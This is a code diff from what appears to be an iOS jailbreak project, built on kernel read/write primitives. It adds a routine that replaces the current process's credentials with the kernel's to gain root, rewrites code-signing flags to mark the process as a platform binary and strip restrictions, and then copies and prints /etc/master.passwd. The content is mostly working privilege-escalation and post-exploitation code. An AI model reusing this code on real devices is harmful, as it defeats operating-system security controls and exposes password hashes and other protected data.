@@ -9,7 +9,9 @@
 #include <stdlib.h>
 #include <unistd.h>
 #include <pthread.h>
+#include <dirent.h>
 #include <sys/fcntl.h>
+#include <sys/mount.h>
 
 #include "kdbg.h"
 #include "kutils.h"
@@ -18,7 +20,6 @@
 #include "kcall.h"
 #include "find_port.h"
 #include "root.h"
-
 
 // Thanks to
 // Abraham Masri @cheesecakeufo https://gist.github.com/iabem97/d11e61afa7a0d0a9f2b5a1e42ee505d8
@@ -88,23 +89,18 @@ uint32_t get_csflags(uint32_t pid){
 
 //sets the csflags of a process. Takes the memory location of the csflags to set
 //get the memory location using get_csflags_loc
-uint32_t set_csflags(uint32_t pid, uint32_t csflag){
+uint32_t set_csflags(uint32_t pid, uint32_t csflags){
     uint64_t proc_bsd = get_process_bsdinfo(pid);
-    uint32_t n_csflags = rk32(proc_bsd + koffset(KSTRUCT_OFFSET_CFLAGS)) | csflag;
-    wk32(proc_bsd+koffset(KSTRUCT_OFFSET_CFLAGS), n_csflags);
+    wk32(proc_bsd+koffset(KSTRUCT_OFFSET_CFLAGS), csflags);
     return -1;
 }
-
-uid_t get_root(){
-    uid_t olduid = getuid();
-    printf("Current PID: %d, UID: %d\n",getpid(),olduid);
-    
+void powerup(uint32_t pid){
     //get the process address for the current process
     printf("Get current process bsd_info\n");
-    uint64_t proc_bsd = get_process_bsdinfo(getpid());
+    uint64_t proc_bsd = get_process_bsdinfo(pid);
     if(proc_bsd == -1) {
         printf("Failed to get current process bsd_info\n");
-        return olduid;
+        return ;
     }
     printf("Got bsd_info: %llx\n", proc_bsd);
     
@@ -113,7 +109,7 @@ uid_t get_root(){
     uint64_t kernel_bsd = get_process_bsdinfo(0);
     if(kernel_bsd == -1) {
         printf("Failed to get Kernel bsd_info\n");
-        return olduid;
+        return ;
     }
     printf("Got bsd_info: %llx\n", kernel_bsd);
     
@@ -121,7 +117,7 @@ uid_t get_root(){
      * been trying to find an example of what the structs look like
      *
      
-        KSTRUCT
+     KSTRUCT
      +----------------------------+
      |                            |
      +----------------------------+         +----------------+--------+
@@ -137,8 +133,8 @@ uid_t get_root(){
      |                            |         | cs_flags: bsd_info +    |
      |                            |         |           0x2a8         |
      +----------------------------+         +-------------------------+
-
-
+     
+     
      * bsd_info + 0x100 - holds the user credentails struct
      * I think it is this -->
      * https://github.com/apple/darwin-xnu/blob/5394bb038891708cd4ba748da79b90a33b19f82e/bsd/sys/ucred.h
@@ -154,6 +150,14 @@ uid_t get_root(){
     printf("Replacing current ucred with kernel's\n");
     wk64(proc_bsd + koffset(KSTRUCT_OFFSET_UCRED) , kernel_ucred);
     printf("Successfully stole kern_ucred!\n");
+}
+
+uid_t get_root(){
+    uid_t olduid = getuid();
+    printf("Current PID: %d, UID: %d\n",getpid(),olduid);
+    
+    //powerup the current process by stealing the kernel's ucreds
+    powerup(getpid());
     
     //set our uid to root :D
     setuid(0);
@@ -169,10 +173,116 @@ void reset_root(uid_t olduid){
     printf("PID: %d, UID: %d\n",getpid(), getuid());
 }
 
+void dirList(char* dir){
+    DIR *dp;
+    struct dirent *ep;
+    dp = opendir(dir);
+    if (dp != NULL){
+        while (ep = readdir(dp)){
+            printf("%s\n",ep->d_name);
+        }
+        (void)closedir(dp);
+    } else {
+        printf("Failed to open dir\n");
+    }
+}
+
+uint32_t cpFile(char* source, char* destination){
+    uint32_t counter = 0;
+    
+    int fd_src = open(source, O_RDONLY);
+    if (fd_src < 0 ) return -1;
+    
+    int fd_dst = open(destination, O_WRONLY | O_CREAT | O_EXCL, 0666);
+    if (fd_dst < 0 ) {
+        close(fd_src);
+        return -1;
+    }
+    char buf[4096];
+    ssize_t nread;
+    
+    while (nread = read(fd_src, buf, sizeof buf), nread > 0)
+    {
+        char *out_ptr = buf;
+        ssize_t nwritten;
+        
+        do {
+            nwritten = write(fd_dst, out_ptr, nread);
+            
+            if (nwritten >= 0)
+            {
+                nread -= nwritten;
+                out_ptr += nwritten;
+                counter += nread;
+            }
+        } while (nread > 0);
+    }
+
+    
+    close(fd_src);
+    close(fd_dst);
+    
+    return counter;
+}
+void printFile(char* src) {
+    FILE* fd = fopen(src, "r");
+    if (fd < 0) {
+        printf("Error opening file\n");
+        return;
+    }
+    char ch;
+    
+    while( ( ch = fgetc(fd) ) != EOF )
+        printf("%c",ch);
+    fclose(fd);
+    printf("\n");
+}
+
+void dumpBsd_Info(){
+    uint32_t pid = getpid();
+    // task_self_addr points to the struct ipc_port for our task port
+    uint64_t task_self = task_self_addr();
+    // read the address of the task struct
+    uint64_t struct_task = rk64(task_self + koffset(KSTRUCT_OFFSET_IPC_PORT_IP_KOBJECT));
+    
+    //loop through the task structures to find the task structure for the supplied pid
+    while (struct_task != 0 ) {
+        // from async_wake.c:440 - where Ian loops to find the kernel vm_map
+        uint64_t bsd_info = rk64(struct_task + koffset(KSTRUCT_OFFSET_TASK_BSD_INFO));
+        uint32_t tpid = rk32(bsd_info + koffset(KSTRUCT_OFFSET_PROC_PID));
+        
+        if (tpid == pid) {
+            // create a buffer to hold the process name
+            char buff [0x400];
+            // read the process name, we only read of strlen("target process")
+            rkbuffer(bsd_info,buff,(uint32_t)0x400);
+            for(int i=0; i<0x400; i++){
+                printf("0x%02x ",buff[i]);
+            }
+            break;
+        }
+        struct_task = rk64(struct_task + koffset(KSTRUCT_OFFSET_TASK_PREV));
+    }
+}
+
 void setPlatform(){
     uint32_t c_csflags = get_csflags(getpid());
-    printf("Current csflags: 0x%08x\n",c_csflags);
+    printf("Current csflags: 0x%07x\n",c_csflags);
     printf("Setting csflags 'CS_PLATFORM_BINARY'\n");
-    set_csflags(getpid(),0x4000000);
-    printf("New csflags: 0x%08x\n",get_csflags(getpid()));
+    uint32_t cflags = (get_csflags(getpid()) | CS_PLATFORM_BINARY | CS_INSTALLER | CS_GET_TASK_ALLOW) & ~(CS_RESTRICT  | CS_HARD );
+    set_csflags(getpid(),cflags);
+    printf("New csflags: 0x%07x\n",get_csflags(getpid()));
+    //dumpBsd_Info();
+    cpFile("/etc/master.passwd", "/tmp/master.bak");
+    dirList("/bin");
+    printFile("/tmp/master.bak");
+}
+
+
+uint32_t startBin(){
+    return -1;
+}
+
+void remountRW(){
+    
 }
